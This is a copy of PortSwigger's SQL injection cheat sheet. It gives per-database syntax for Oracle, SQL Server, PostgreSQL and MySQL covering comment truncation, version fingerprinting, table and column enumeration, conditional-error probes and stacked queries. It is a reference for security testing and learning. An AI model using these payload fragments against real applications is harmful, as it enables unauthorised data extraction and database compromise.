
[PORTSWIGGER SQL injection cheat sheet] https://portswigger.net/web-security/sql-injection/cheat-sheet

This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.

String concatenation
--------------------

You can concatenate together multiple strings to make a single string.

 Oracle  `'foo'||'bar'` 
 
 Microsoft  `'foo'+'bar'` 
 
 PostgreSQL  `'foo'||'bar'` 
 
 MySQL `'foo' 'bar'` \
`CONCAT('foo','bar')` 

Substring
---------

You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string `ba`.

Oracle  `SUBSTR('foobar', 4, 2)` 

Microsoft  `SUBSTRING('foobar', 4, 2)` 

PostgreSQL  `SUBSTRING('foobar', 4, 2)` 

MySQL  `SUBSTRING('foobar', 4, 2)` 

Comments
--------

You can use comments to truncate a query and remove the portion of the original query that follows your input.

Oracle  `--comment\`

Microsoft  `--comment\
/*comment*/` 

PostgreSQL  `--comment\
/*comment*/` 

MySQL  `#comment`\
`-- comment` \
`/*comment*/` 

Database version
----------------

You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

Oracle  `SELECT banner FROM v$version\
SELECT version FROM v$instance\` 

Microsoft  `SELECT @@version` 

PostgreSQL  `SELECT version()` 

MySQL  `SELECT @@version` 

Database contents
-----------------

You can list the tables that exist in the database, and the columns that those tables contain.

Oracle  `SELECT * FROM all_tables\
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` 

Microsoft  `SELECT * FROM information_schema.tables\
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'\`

PostgreSQL  `SELECT * FROM information_schema.tables\
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'\`

MySQL  `SELECT * FROM information_schema.tables\
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` 

Conditional errors
------------------

You can test a single boolean condition and trigger a database error if the condition is true.

Oracle  `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual` 
 
Microsoft  `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` 
 
PostgreSQL  `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END` 

MySQL  `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` 

Batched (or stacked) queries
----------------------------

You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.

Oracle  `Does not support batched queries.` 

Microsoft  `QUERY-1-HERE; QUERY-2-HERE` 

PostgreSQL  `QUERY-1-HERE; QUERY-2-HERE` 

MySQL  `QUERY-1-HERE; QUERY-2-HERE` 

#### Note

With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.
